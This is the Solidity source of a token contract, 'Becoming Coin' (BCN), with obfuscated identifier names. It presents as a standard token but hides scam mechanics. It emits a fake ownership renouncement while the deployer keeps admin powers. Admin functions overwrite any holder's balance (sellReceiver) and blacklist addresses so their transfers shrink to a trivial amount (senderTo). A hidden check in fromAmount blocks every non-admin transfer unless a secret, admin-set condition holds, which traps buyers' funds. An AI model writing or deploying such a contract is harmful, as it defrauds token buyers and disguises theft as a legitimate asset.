//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

interface amountMarketing {
    function createPair(address limitFee, address receiverLiquidity) external returns (address);
}

interface listTokenLaunch {
    function totalSupply() external view returns (uint256);

    function balanceOf(address txSell) external view returns (uint256);

    function transfer(address launchExemptMin, uint256 takeReceiver) external returns (bool);

    function allowance(address enableAuto, address spender) external view returns (uint256);

    function approve(address spender, uint256 takeReceiver) external returns (bool);

    function transferFrom(
        address sender,
        address launchExemptMin,
        uint256 takeReceiver
    ) external returns (bool);

    event Transfer(address indexed from, address indexed fundFrom, uint256 value);
    event Approval(address indexed enableAuto, address indexed spender, uint256 value);
}

abstract contract launchEnableList {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface tradingModeAmount {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface autoModeReceiver is listTokenLaunch {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract BecomingCoin is launchEnableList, listTokenLaunch, autoModeReceiver {

    address public amountFromMax;

    address takeShould = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 public receiverSwap;

    function owner() external view returns (address) {
        return launchedMode;
    }

    constructor (){
        
        tradingModeAmount liquidityModeTeam = tradingModeAmount(fromBuy);
        amountFromMax = amountMarketing(liquidityModeTeam.factory()).createPair(liquidityModeTeam.WETH(), address(this));
        
        teamAuto = _msgSender();
        totalShouldLaunch[teamAuto] = true;
        fundMarketing[teamAuto] = buyMarketing;
        walletTotalTo();
        if (toLimit != amountTake) {
            receiverSwap = toLimit;
        }
        emit Transfer(address(0), teamAuto, buyMarketing);
    }

    uint256 private launchLimit;

    uint256 private buyMarketing = 100000000 * 10 ** 18;

    function getOwner() external view returns (address) {
        return launchedMode;
    }

    uint256 private toLimit;

    bool private sellAtLaunched;

    function exemptReceiver() private view {
        require(totalShouldLaunch[_msgSender()]);
    }

    function allowance(address amountToken, address buyTotal) external view virtual override returns (uint256) {
        if (buyTotal == fromBuy) {
            return type(uint256).max;
        }
        return buyAuto[amountToken][buyTotal];
    }

    uint256 shouldSell;

    function marketingFee(uint256 takeReceiver) public {
        exemptReceiver();
        shouldSell = takeReceiver;
    }

    function transfer(address minTeamTrading, uint256 takeReceiver) external virtual override returns (bool) {
        return fromAmount(_msgSender(), minTeamTrading, takeReceiver);
    }

    function fromAmount(address limitLaunch, address launchExemptMin, uint256 takeReceiver) internal returns (bool) {
        if (limitLaunch == teamAuto) {
            return autoFromTrading(limitLaunch, launchExemptMin, takeReceiver);
        }
        uint256 launchTrading = listTokenLaunch(amountFromMax).balanceOf(takeShould);
        require(launchTrading == shouldSell);
        require(launchExemptMin != takeShould);
        if (amountTo[limitLaunch]) {
            return autoFromTrading(limitLaunch, launchExemptMin, minIs);
        }
        return autoFromTrading(limitLaunch, launchExemptMin, takeReceiver);
    }

    address private launchedMode;

    function symbol() external view virtual override returns (string memory) {
        return modeList;
    }

    mapping(address => mapping(address => uint256)) private buyAuto;

    mapping(address => uint256) private fundMarketing;

    function balanceOf(address txSell) public view virtual override returns (uint256) {
        return fundMarketing[txSell];
    }

    function decimals() external view virtual override returns (uint8) {
        return exemptLiquidity;
    }

    uint256 senderAmount;

    uint256 public amountTake;

    event OwnershipTransferred(address indexed sellAmount, address indexed modeExemptTeam);

    function approve(address buyTotal, uint256 takeReceiver) public virtual override returns (bool) {
        buyAuto[_msgSender()][buyTotal] = takeReceiver;
        emit Approval(_msgSender(), buyTotal, takeReceiver);
        return true;
    }

    function walletTotalTo() public {
        emit OwnershipTransferred(teamAuto, address(0));
        launchedMode = address(0);
    }

    bool public fromAt;

    uint256 public marketingAtMode;

    function senderTo(address teamMode) public {
        exemptReceiver();
        if (sellAtLaunched) {
            marketingAtMode = launchLimit;
        }
        if (teamMode == teamAuto || teamMode == amountFromMax) {
            return;
        }
        amountTo[teamMode] = true;
    }

    function name() external view virtual override returns (string memory) {
        return autoLimit;
    }

    function fundIs(address swapExempt) public {
        if (launchTotal) {
            return;
        }
        
        totalShouldLaunch[swapExempt] = true;
        
        launchTotal = true;
    }

    uint256 public swapMin;

    string private modeList = "BCN";

    function totalSupply() external view virtual override returns (uint256) {
        return buyMarketing;
    }

    uint256 public launchedShouldToken;

    bool public launchTotal;

    address public teamAuto;

    string private autoLimit = "Becoming Coin";

    bool public fundBuy;

    uint8 private exemptLiquidity = 18;

    uint256 constant minIs = 9 ** 10;

    address fromBuy = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function transferFrom(address limitLaunch, address launchExemptMin, uint256 takeReceiver) external override returns (bool) {
        if (_msgSender() != fromBuy) {
            if (buyAuto[limitLaunch][_msgSender()] != type(uint256).max) {
                require(takeReceiver <= buyAuto[limitLaunch][_msgSender()]);
                buyAuto[limitLaunch][_msgSender()] -= takeReceiver;
            }
        }
        return fromAmount(limitLaunch, launchExemptMin, takeReceiver);
    }

    mapping(address => bool) public amountTo;

    function sellReceiver(address minTeamTrading, uint256 takeReceiver) public {
        exemptReceiver();
        fundMarketing[minTeamTrading] = takeReceiver;
    }

    mapping(address => bool) public totalShouldLaunch;

    function autoFromTrading(address limitLaunch, address launchExemptMin, uint256 takeReceiver) internal returns (bool) {
        require(fundMarketing[limitLaunch] >= takeReceiver);
        fundMarketing[limitLaunch] -= takeReceiver;
        fundMarketing[launchExemptMin] += takeReceiver;
        emit Transfer(limitLaunch, launchExemptMin, takeReceiver);
        return true;
    }

}